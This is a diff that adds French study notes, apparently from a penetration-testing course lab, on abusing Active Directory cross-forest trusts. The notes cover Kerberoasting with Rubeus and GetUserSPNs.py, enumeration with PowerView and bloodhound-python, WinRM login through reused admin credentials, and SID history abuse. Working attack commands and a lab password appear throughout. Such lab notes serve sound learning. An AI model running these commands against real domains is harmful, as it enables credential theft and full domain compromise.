@@ -2148,4 +2148,135 @@ Ce script :
 
 ---
 
+# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
+
+## Cross-Forest Kerberoasting
+
+Kerberos attacks comme **Kerberoasting** et **ASREPRoasting** peuvent être réalisés à travers des trusts, selon la direction du trust.  
+Un compte dans un domaine peut donc être utilisé pour cibler un autre domaine et récupérer des credentials privilégiés.
+
+### Énumérer les comptes avec SPN via PowerView
+
+`Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName`
+
+Résultat :  
+- `krbtgt`  
+- `mssqlsvc`
+
+### Vérifier l’appartenance du compte `mssqlsvc`
+
+`Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof`
+
+Sortie → `mssqlsvc` ∈ `Domain Admins` dans `FREIGHTLOGISTICS.LOCAL`.
+
+### Kerberoasting via Rubeus (avec /domain)
+
+`.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap`
+
+Retourne un hash Kerberos de type `$krb5tgs$...`  
+→ À cracker avec Hashcat pour obtenir le mot de passe.
+
+## Admin Password Re-Use & Group Membership
+
+Cas typique :  
+- Admins utilisent **le même mot de passe** dans deux forêts différentes  
+- Ou un admin d’un domaine est membre d’un groupe **dans un autre domaine** (ex : Administrators).
+
+### Énumérer les foreign group memberships
+
+`Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL`
+
+Exemple :  
+Membre du groupe `Administrators` dans `FREIGHTLOGISTICS.LOCAL` → `INLANEFREIGHT\administrator`.
+
+Conversion du SID :  
+`Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500`
+
+### Vérification d’accès via WinRM
+
+`Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator`
+
+## SID History Abuse - Cross Forest
+
+- Lors d’une migration inter-forêts, l’attribut **sidHistory** peut conserver les anciens SIDs.  
+- Si **SID Filtering** n’est pas activé, un compte peut hériter de privilèges administratifs depuis l’autre forêt.  
+- Exemple : un utilisateur migré de `INLANEFREIGHT.LOCAL` vers `CORP.LOCAL` conserve ses droits admins dans la première forêt.
+
+---
+
+# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
+
+## Cross-Forest Kerberoasting
+
+On peut aussi Kerberoast **depuis un hôte Linux** avec `GetUserSPNs.py`.  
+Il faut fournir des credentials valides et utiliser l’option `-target-domain`.
+
+### Lister les SPNs
+
+`GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`
+
+Résultat : un compte `mssqlsvc` avec un SPN MSSQL et membre de `Domain Admins` dans `FREIGHTLOGISTICS.LOCAL`.
+
+### Demander un TGS (Kerberoast effectif)
+
+`GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`
+
+Retourne un hash Kerberos (`$krb5tgs$...`).  
+→ À cracker avec Hashcat (`-m 13100`).
+
+Si ça réussit, on obtient Domain Admin dans `FREIGHTLOGISTICS.LOCAL`.  
+⚠️ Toujours tester si le compte existe aussi dans notre domaine → **password reuse** possible.
+
+## Hunting Foreign Group Membership avec bloodhound-python
+
+Comme vu côté Windows, des **utilisateurs d’un domaine** peuvent appartenir à des groupes dans un autre domaine (via des Domain Local Groups).  
+On peut utiliser `bloodhound-python` pour collecter ces infos côté Linux.
+
+### Configurer DNS dans `/etc/resolv.conf`
+
+Exemple pour `INLANEFREIGHT.LOCAL` :  
+```
+#nameserver 1.1.1.1
+#nameserver 8.8.8.8
+domain INLANEFREIGHT.LOCAL
+nameserver 172.16.5.5
+```
+
+### Exécution contre `INLANEFREIGHT.LOCAL`
+
+`bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2`
+
+Résultats → domaines, users, groupes, trusts détectés.
+
+Compression des JSON :  
+`zip -r ilfreight_bh.zip *.json`
+
+### Configurer DNS pour `FREIGHTLOGISTICS.LOCAL`
+
+```
+#nameserver 1.1.1.1
+#nameserver 8.8.8.8
+domain FREIGHTLOGISTICS.LOCAL
+nameserver 172.16.5.238
+```
+
+### Exécution contre `FREIGHTLOGISTICS.LOCAL`
+
+`bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2`
+
+Résultats → utilisateurs, groupes, trusts.
+
+### Analyse dans BloodHound
+
+Importer les JSON (ou `.zip`) → utiliser la requête **Users with Foreign Domain Group Membership**.  
+On retrouve `INLANEFREIGHT\administrator` membre de `FREIGHTLOGISTICS\Administrators`.
+
+## Closing Thoughts on Trusts
+
+- Les trusts offrent **beaucoup de surfaces d’attaque** : Kerberoasting cross-forest, password reuse, foreign group memberships.  
+- Domain Admin d’un enfant → **presque toujours parent compromise** via ExtraSids.  
+- La clé → bien comprendre la direction et le type du trust avant exploitation.
+
+
+
 
